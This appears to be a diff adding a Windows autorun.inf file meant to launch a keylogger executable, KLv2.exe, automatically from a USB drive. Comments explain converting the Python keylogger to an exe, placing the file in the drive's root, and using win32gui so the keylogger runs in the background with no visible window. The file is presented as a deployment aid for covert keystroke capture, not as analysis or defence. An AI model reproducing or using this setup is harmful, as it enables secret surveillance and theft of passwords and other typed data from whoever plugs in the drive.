@@ -1,0 +1,9 @@
+#Can use this file to autorun the keylogger file from a USB drive
+#Note, may need to alter the python script to include the drive
+#Py script must be converted to an exe file
+#Save as .inf file, place into root directory of USB drive
+#Can alter keylogger to use win32gui so there isn't a pop up window and runs in the background
+
+[autorun] 
+open=KLv2.exe 
+icon=IconFile.ico 
